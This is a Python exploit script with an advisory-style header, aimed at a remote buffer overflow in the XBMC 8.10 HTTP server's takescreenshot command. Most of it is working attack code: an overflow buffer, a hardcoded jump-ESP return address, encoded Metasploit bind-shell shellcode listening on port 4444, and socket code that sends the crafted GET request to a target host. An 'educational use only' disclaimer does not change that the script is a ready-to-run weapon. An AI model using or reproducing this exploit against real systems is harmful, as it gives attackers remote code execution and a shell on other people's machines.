#!/usr/bin/env python 
'''
Xbmc takescreenshot request remote buffer overflow 8.10 !!! 
 
Tested:Win xp sp2 eng 
Vendor url:http://xbmc.org/ 
Release date:April the 1st 2009
 
versions affected: 
Linux windows < tested 
other versions are also possibly affected. 
 
Restrictions:No restrictions 

This exploit happens when parsing and overly long file name
to the server using the takescreenshot command.
there is a description in the poc code.

When passing this to the http server we can evade url: filtering
as it is passed to the application as an overly long dir.
This means we can use any shell code we wish.

We are able to overwrite the exception handlers also so 
creating a reliable exploit for vista and xps3 shouldn't 
be to hard have a look there are some modules loaded with 
out /safe seh. 

Credits to n00b for finding the buffer overflow and writing 
poc code and exploit.

----------
Disclaimer
----------
The information in this advisory and any of its
demonstrations is provided "as is" without any
warranty of any kind.

I am not liable for any direct or indirect damages
caused as a result of using the information or
demonstrations provided in any part of this advisory.
Educational use only..!!
'''

import sys, socket 
import struct

port = 80 
host = sys.argv[1] 

Start_url ='xbmcCmds/xbmcHttp?command=takescreenshot('
Junk_buffer = 'A'*1036
Jump_esp = struct.pack('<L',0x77F84143)

Shell_code=(#win32_bind -EXITFUNC=seh LPORT=4444 http://metasploit.com */
"\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff\x4f\x49\x49\x49\x49\x49"
"\x49\x51\x5a\x56\x54\x58\x36\x33\x30\x56\x58\x34\x41\x30\x42\x36"
"\x48\x48\x30\x42\x33\x30\x42\x43\x56\x58\x32\x42\x44\x42\x48\x34"
"\x41\x32\x41\x44\x30\x41\x44\x54\x42\x44\x51\x42\x30\x41\x44\x41"
"\x56\x58\x34\x5a\x38\x42\x44\x4a\x4f\x4d\x4e\x4f\x4c\x36\x4b\x4e"
"\x4d\x34\x4a\x4e\x49\x4f\x4f\x4f\x4f\x4f\x4f\x4f\x42\x46\x4b\x58"
"\x4e\x36\x46\x32\x46\x32\x4b\x48\x45\x34\x4e\x53\x4b\x58\x4e\x37"
"\x45\x30\x4a\x47\x41\x30\x4f\x4e\x4b\x58\x4f\x44\x4a\x51\x4b\x58"
"\x4f\x45\x42\x52\x41\x30\x4b\x4e\x49\x44\x4b\x48\x46\x33\x4b\x58"
"\x41\x50\x50\x4e\x41\x53\x42\x4c\x49\x39\x4e\x4a\x46\x58\x42\x4c"
"\x46\x57\x47\x50\x41\x4c\x4c\x4c\x4d\x50\x41\x30\x44\x4c\x4b\x4e"
"\x46\x4f\x4b\x33\x46\x35\x46\x32\x4a\x32\x45\x47\x45\x4e\x4b\x48"
"\x4f\x55\x46\x52\x41\x30\x4b\x4e\x48\x46\x4b\x58\x4e\x50\x4b\x54"
"\x4b\x48\x4f\x35\x4e\x31\x41\x50\x4b\x4e\x43\x50\x4e\x32\x4b\x38"
"\x49\x48\x4e\x36\x46\x32\x4e\x31\x41\x36\x43\x4c\x41\x53\x4b\x4d"
"\x46\x46\x4b\x48\x43\x44\x42\x53\x4b\x38\x42\x34\x4e\x30\x4b\x38"
"\x42\x47\x4e\x41\x4d\x4a\x4b\x48\x42\x34\x4a\x50\x50\x45\x4a\x36"
"\x50\x58\x50\x34\x50\x30\x4e\x4e\x42\x45\x4f\x4f\x48\x4d\x48\x36"
"\x43\x35\x48\x36\x4a\x46\x43\x33\x44\x53\x4a\x46\x47\x37\x43\x37"
"\x44\x53\x4f\x45\x46\x55\x4f\x4f\x42\x4d\x4a\x46\x4b\x4c\x4d\x4e"
"\x4e\x4f\x4b\x33\x42\x35\x4f\x4f\x48\x4d\x4f\x55\x49\x38\x45\x4e"
"\x48\x56\x41\x48\x4d\x4e\x4a\x30\x44\x30\x45\x45\x4c\x36\x44\x50"
"\x4f\x4f\x42\x4d\x4a\x46\x49\x4d\x49\x30\x45\x4f\x4d\x4a\x47\x35"
"\x4f\x4f\x48\x4d\x43\x35\x43\x55\x43\x55\x43\x55\x43\x55\x43\x34"
"\x43\x35\x43\x34\x43\x45\x4f\x4f\x42\x4d\x48\x56\x4a\x46\x41\x51"
"\x4e\x45\x48\x36\x43\x35\x49\x58\x41\x4e\x45\x59\x4a\x46\x46\x4a"
"\x4c\x51\x42\x47\x47\x4c\x47\x45\x4f\x4f\x48\x4d\x4c\x46\x42\x41"
"\x41\x55\x45\x55\x4f\x4f\x42\x4d\x4a\x56\x46\x4a\x4d\x4a\x50\x52"
"\x49\x4e\x47\x55\x4f\x4f\x48\x4d\x43\x45\x45\x45\x4f\x4f\x42\x4d"
"\x4a\x46\x45\x4e\x49\x44\x48\x58\x49\x44\x47\x55\x4f\x4f\x48\x4d"
"\x42\x35\x46\x45\x46\x35\x45\x55\x4f\x4f\x42\x4d\x43\x39\x4a\x46"
"\x47\x4e\x49\x57\x48\x4c\x49\x47\x47\x55\x4f\x4f\x48\x4d\x45\x45"
"\x4f\x4f\x42\x4d\x48\x46\x4c\x46\x46\x56\x48\x56\x4a\x36\x43\x46"
"\x4d\x56\x49\x48\x45\x4e\x4c\x46\x42\x35\x49\x35\x49\x32\x4e\x4c"
"\x49\x48\x47\x4e\x4c\x56\x46\x54\x49\x48\x44\x4e\x41\x53\x42\x4c"
"\x43\x4f\x4c\x4a\x50\x4f\x44\x34\x4d\x32\x50\x4f\x44\x34\x4e\x52"
"\x43\x59\x4d\x48\x4c\x47\x4a\x53\x4b\x4a\x4b\x4a\x4b\x4a\x4a\x36"
"\x44\x37\x50\x4f\x43\x4b\x48\x41\x4f\x4f\x45\x57\x46\x54\x4f\x4f"
"\x48\x4d\x4b\x35\x47\x45\x44\x45\x41\x55\x41\x35\x41\x45\x4c\x36"
"\x41\x30\x41\x55\x41\x35\x45\x45\x41\x35\x4f\x4f\x42\x4d\x4a\x56"
"\x4d\x4a\x49\x4d\x45\x30\x50\x4c\x43\x35\x4f\x4f\x48\x4d\x4c\x36"
"\x4f\x4f\x4f\x4f\x47\x43\x4f\x4f\x42\x4d\x4b\x48\x47\x55\x4e\x4f"
"\x43\x48\x46\x4c\x46\x46\x4f\x4f\x48\x4d\x44\x45\x4f\x4f\x42\x4d"
"\x4a\x36\x42\x4f\x4c\x48\x46\x30\x4f\x45\x43\x35\x4f\x4f\x48\x4d"
"\x4f\x4f\x42\x4d\x5a"

)



End_url ='.jpg;false;0;300;200;90)'

# create a socket object called 'c' 
c = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 

# connect to the socket 
c.connect((host, port)) 

Request = (Start_url + Junk_buffer + Jump_esp + Shell_code + End_url)

# create a file-like object to read 
fileobj = c.makefile('r', 0) 

# Ask the server for the file 
fileobj.write("GET /"+Request+" HTTP/1.1\n\n") 